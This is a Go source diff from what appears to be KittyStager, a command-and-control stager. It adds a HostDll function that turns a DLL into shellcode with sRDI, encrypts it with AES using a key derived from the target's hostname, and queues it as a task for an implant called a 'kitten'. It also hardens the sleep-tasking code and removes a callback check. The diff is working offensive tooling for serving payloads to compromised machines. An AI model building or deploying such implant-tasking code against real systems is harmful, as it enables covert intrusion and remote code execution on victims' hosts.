@@ -2,6 +2,7 @@ package httpUtil
 
 import (
 	"KittyStager/cmd/cryptoUtil"
+	"KittyStager/cmd/srdi"
 	"KittyStager/cmd/util"
 	"encoding/json"
 	"errors"
@@ -28,9 +29,6 @@ var Targets map[string]*Kitten
 func HostShellcode(path string, kittenName string) error {
 	var task util.Task
 	var err error
-	if Targets[kittenName].InitChecks.GetHostname() == "" {
-		return errors.New("wait for the implant to call back")
-	}
 	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
 	sc, err := ioutil.ReadFile(path)
 	contentType := http.DetectContentType(sc)
@@ -43,7 +41,7 @@ func HostShellcode(path string, kittenName string) error {
 		task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}
 
 	}
-	payload, _ := json.Marshal(task)
+	payload, err := json.Marshal(task)
 	shellcode, err := bytesToAES(payload, key)
 
 	if err != nil {
@@ -51,20 +49,50 @@ func HostShellcode(path string, kittenName string) error {
 	}
 	fmt.Println(color.Green("[+] Key generated is : " + key))
 	Targets[kittenName].SetPayload(shellcode)
-	fmt.Println(color.Green("[+] shellcode hosted for " + kittenName))
+	fmt.Println(color.Green("[+] Shellcode hosted for " + kittenName))
 	return error(nil)
 }
 
 // HostSleep Hosts the sleep time the same way as the shellcode
-func HostSleep(t int, kittenName string) {
+func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
 	var task util.Task
 	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
 	task = util.Task{Tag: "sleep", Payload: []byte(fmt.Sprintf("%d", t))}
-	payload, _ := json.Marshal(task)
-	sleep, _ := bytesToAES(payload, key)
+	payload, err := json.Marshal(task)
+	if err != nil {
+		return err
+	}
+	sleep, err := bytesToAES(payload, key)
+	if err != nil {
+		return err
+	}
 	Targets[kittenName].SetPayload(sleep)
 	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(kittenName))
+	return error(nil)
+}
+
+func HostDll(path, entry, kittenName string) error {
+	var task util.Task
+	var err error
+	key := cryptoUtil.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	dll, err := ioutil.ReadFile(path)
+	if err != nil {
+		return err
+	}
+	sc, err := srdi.DllToShellcode(dll, entry)
+	hexstring := fmt.Sprintf("%x ", sc)
+	task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}
+	payload, err := json.Marshal(task)
+	shellcode, err := bytesToAES(payload, key)
+
+	if err != nil {
+		return err
+	}
+	fmt.Println(color.Green("[+] Key generated is : " + key))
+	Targets[kittenName].SetPayload(shellcode)
+	fmt.Println(color.Green("[+] Dll hosted for " + kittenName))
+	return error(nil)
 }
 
 // bytesToAES cypher the shellcode with AES
